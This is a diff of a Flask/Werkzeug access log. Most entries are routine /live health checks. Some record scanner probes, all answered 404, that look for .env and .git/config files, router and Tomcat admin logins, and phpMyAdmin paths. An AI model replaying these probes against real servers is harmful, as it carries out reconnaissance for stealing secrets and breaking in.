+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:45:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:46:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:47:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:48:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:49:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:50:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:51:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:52:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:53:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:54:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:55:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:56:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:57:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:58:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 18:59:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:00:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:01:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:02:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:03:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:04:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:05:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:06:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:07:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:08:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:09:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:10:08] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.193.196 - - [03/Oct/2021 19:10:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:10:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:10:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:10:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:10:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:10:56] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:16] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:26] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:11:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.226.235.194 - - [03/Oct/2021 19:12:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:167.248.133.41 - - [03/Oct/2021 19:24:19] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:167.248.133.41 - - [03/Oct/2021 19:24:19] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:34.141.33.101 - - [03/Oct/2021 20:18:33] "GET / HTTP/1.0" 404 -
+INFO:werkzeug:185.234.229.212 - - [03/Oct/2021 20:24:58] "GET / HTTP/1.0" 404 -
+INFO:werkzeug:159.203.58.137 - - [03/Oct/2021 20:46:16] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug:18.208.183.4 - - [03/Oct/2021 22:08:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:178.62.111.143 - - [03/Oct/2021 22:13:31] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug:198.98.49.124 - - [03/Oct/2021 22:25:57] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:192.241.209.26 - - [03/Oct/2021 22:29:31] "GET /manager/text/list HTTP/1.1" 404 -
+INFO:werkzeug:107.189.14.98 - - [03/Oct/2021 22:38:15] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:52.224.245.245 - - [03/Oct/2021 22:44:06] "GET /.git/config HTTP/1.1" 404 -
+INFO:werkzeug:107.189.6.44 - - [03/Oct/2021 23:57:46] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:199.19.225.172 - - [04/Oct/2021 00:05:23] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:45.95.147.26 - - [04/Oct/2021 00:18:31] "HEAD /robots.txt HTTP/1.0" 404 -
+INFO:werkzeug:107.189.14.98 - - [04/Oct/2021 00:24:47] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:147.182.229.23 - - [04/Oct/2021 00:37:37] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug:195.205.161.163 - - [04/Oct/2021 00:52:18] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:192.241.198.97 - - [04/Oct/2021 01:22:12] "GET /manager/html HTTP/1.1" 404 -
+INFO:werkzeug:162.142.125.60 - - [04/Oct/2021 01:32:47] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:162.142.125.60 - - [04/Oct/2021 01:32:48] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:143.198.132.14 - - [04/Oct/2021 01:41:58] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:33] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:09:56] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:16] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:21] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:10:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:06] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:21] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:51] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:11:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:36] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:12:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:01] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:26] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:13:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.237.71.161 - - [04/Oct/2021 23:14:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:209.141.56.212 - - [04/Oct/2021 23:35:57] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:186.33.78.145 - - [05/Oct/2021 00:35:56] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:190.237.20.118 - - [05/Oct/2021 00:52:44] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:69.203.147.238 - - [05/Oct/2021 01:34:46] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:149.34.63.47 - - [05/Oct/2021 02:03:45] "GET / HTTP/1.1" 404 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:35.173.215.40 - - [05/Oct/2021 01:58:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:55:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:56:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:57:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:58:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 13:59:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:00:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:01:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:02:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:35.173.215.40 - - [10/Oct/2021 14:03:49] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:154.89.5.50 - - [10/Oct/2021 14:19:27] "GET / HTTP/1.0" 404 -
+INFO:werkzeug:23.91.96.133 - - [10/Oct/2021 14:22:42] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:147.182.137.241 - - [10/Oct/2021 15:04:02] "GET /.env HTTP/1.1" 404 -
+INFO:werkzeug:147.182.137.241 - - [10/Oct/2021 15:04:02] "POST / HTTP/1.1" 404 -
+INFO:werkzeug:209.141.56.212 - - [10/Oct/2021 15:17:23] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:51.254.59.113 - - [10/Oct/2021 15:20:33] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:209.141.56.41 - - [10/Oct/2021 15:20:47] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:29] "GET /pma2019/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:30] "GET /PMA2015/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:30] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:30] "GET /phpMyAdmin5/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:30] "GET /phpMyAdmin1/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:30] "GET /sql/phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:31] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:31] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:31] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:31] "GET /db/webdb/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:32] "GET /phpMyAdmin-5.1.0-english/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:32] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 -
+INFO:werkzeug:167.71.185.193 - - [10/Oct/2021 17:07:32] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 -
